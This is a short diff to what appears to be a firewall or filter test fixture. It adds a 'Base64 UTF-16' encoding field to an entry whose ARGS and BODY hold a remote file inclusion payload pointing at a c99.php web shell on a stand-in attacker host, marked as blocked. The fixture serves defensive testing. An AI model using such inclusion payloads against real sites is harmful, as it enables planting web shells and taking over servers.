@@ -3,6 +3,7 @@
     {
       "ARGS": "path=http://evil.example.com/c99.php",
       "BODY": "path=http://evil.example.com/c99.php",
+      "ENCODE": "Base64 UTF-16",
       "BLOCKED": true
     }
   ]
